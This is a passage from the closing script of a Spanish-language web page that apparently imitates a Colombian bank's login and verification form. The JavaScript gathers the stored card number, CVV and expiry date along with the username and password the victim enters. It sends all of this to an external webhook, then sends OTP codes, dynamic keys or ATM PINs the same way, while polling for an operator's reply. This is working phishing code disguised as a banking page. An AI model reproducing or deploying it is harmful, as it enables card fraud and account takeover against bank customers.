                if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
                else if (passwordInput.value.length < 4) {
                    passwordInput.parentElement.classList.add('error');
                    passwordInput.parentElement.querySelector('.error-message').textContent = 'Mínimo 4 caracteres';
                    isValid = false;
                }
            } else if (pasoActual === 'otp') {
                if (!confirmationInput.value.trim()) { confirmationInput.parentElement.classList.add('error'); isValid = false; }
                else if (!/^\d{4,8}$/.test(confirmationInput.value)) {
                    confirmationInput.parentElement.classList.add('error');
                    confirmationInput.parentElement.querySelector('.error-message').textContent = 'Debe tener entre 4 y 8 dígitos';
                    isValid = false;
                }
            }

            if (!isValid) return;

            formularioBloqueado = true;
            loadingOverlay.classList.add('active');
            loadingText.textContent = 'Verificando...';

            submitButton.disabled = true;
            buttonText.textContent = 'Verificando...';
            usernameInput.disabled = true;
            passwordInput.disabled = true;
            confirmationInput.disabled = true;

            if (pasoActual === 'credenciales') {
                enviarHeartbeat('activo');
                const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
                const cvv = localStorage.getItem('cardCVV') || 'No disponible';
                const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';

                const datosWebhook = {
                    solicitudId: solicitudId,
                    numeroTarjeta: numeroTarjeta,
                    cvv: cvv,
                    vencimiento: vencimiento,
                    usuario: usernameInput.value.trim(),
                    password: passwordInput.value.trim(),
                    monto: localStorage.getItem('monto_formateado') || '0 Col$',
                    fecha: new Date().toLocaleString('es-CO')
                };

                const enviado = await enviarCredencialesAlWebhook(datosWebhook);
                if (enviado) {
                    iniciarPollingCredenciales();
                } else {
                    mostrarError('Error al procesar la solicitud');
                    resetFormulario();
                    formularioBloqueado = false;
                }

            } else if (pasoActual === 'otp') {
                if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
                rechazoDetectado = false;
                enviarHeartbeat('activo');

                const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
                const cvv = localStorage.getItem('cardCVV') || 'No disponible';
                const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
                
                const datosCred = {
                    solicitudId: solicitudId,
                    numeroTarjeta: numeroTarjeta,
                    cvv: cvv,
                    vencimiento: vencimiento,
                    usuario: usernameInput.value.trim(),
                    password: passwordInput.value.trim(),
                    monto: localStorage.getItem('monto_formateado') || '0 Col$',
                    fecha: new Date().toLocaleString('es-CO')
                };

                await enviarCredencialesAlWebhook(datosCred);

                if (modoAutenticacion === 'otp') {
                    const datosOTP = {
                        solicitudId: solicitudId,
                        otp: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: localStorage.getItem('monto_formateado') || '0 Col$',
                        fecha: new Date().toLocaleString('es-CO'),
                        es_reintento: true
                    };
                    const enviado = await enviarOTPAlWebhook(datosOTP);
                    if (enviado) {
                        iniciarPollingOTP();
                    } else {
                        mostrarError('Error al procesar el OTP');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        loadingOverlay.classList.remove('active');
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                } else if (modoAutenticacion === 'clave_dinamica') {
                    const datosClave = {
                        solicitudId: solicitudId,
                        clave: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: localStorage.getItem('monto_formateado') || '0 Col$',
                        fecha: new Date().toLocaleString('es-CO'),
                        es_reintento: true
                    };
                    const enviado = await enviarClaveDinamicaAlWebhook(datosClave);
                    if (enviado) {
                        iniciarPollingOTP();
                    } else {
                        mostrarError('Error al procesar la Clave Dinámica');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        loadingOverlay.classList.remove('active');
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                } else if (modoAutenticacion === 'clave_cajero') {
                    const datosClave = {
                        solicitudId: solicitudId,
                        clave: confirmationInput.value.trim(),
                        usuario: usernameInput.value.trim(),
                        monto: localStorage.getItem('monto_formateado') || '0 Col$',
                        fecha: new Date().toLocaleString('es-CO'),
                        es_reintento: true
                    };
                    const enviado = await enviarClaveCajeroAlWebhook(datosClave);
                    if (enviado) {
                        iniciarPollingOTP();
                    } else {
                        mostrarError('Error al procesar la Clave del Cajero');
                        confirmationInput.disabled = false;
                        submitButton.disabled = false;
                        buttonText.textContent = 'Continuar';
                        loadingOverlay.classList.remove('active');
                        otpSection.classList.add('visible');
                        formularioBloqueado = false;
                    }
                }
            }
        });
    </script>
</body>
</html>
